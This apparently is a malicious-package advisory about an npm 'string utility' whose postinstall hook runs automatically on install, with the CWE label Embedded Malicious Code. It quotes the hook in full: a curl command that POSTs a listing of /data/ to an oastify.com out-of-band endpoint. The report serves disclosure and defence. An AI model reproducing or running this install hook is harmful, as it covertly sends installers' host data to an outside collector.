summary: postinstall hook exfiltrates filesystem listing to attacker-controlled oastify.com endpoint
details: package.json declares a postinstall lifecycle hook that auto-executes on every `npm install`: `curl -X POST -d "$(ls -la /data/)" http://3dhd6wwmusbh04m22igmzvb4hvnmblza.oastify.com/data`. The shell command substitution runs `ls -la /data/` on the installer's host and POSTs the directory listing over plaintext HTTP to a randomized subdomain of oastify.com, which is Burp Suite Collaborator out-of-band infrastructure commonly used by attackers and researchers for exfiltration beacons. The package advertises itself as a string utility — there is no benign reason for a string library to enumerate `/data/` and beacon host contents to an OOB collector. This is an unambiguous install-time exfiltration payload.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
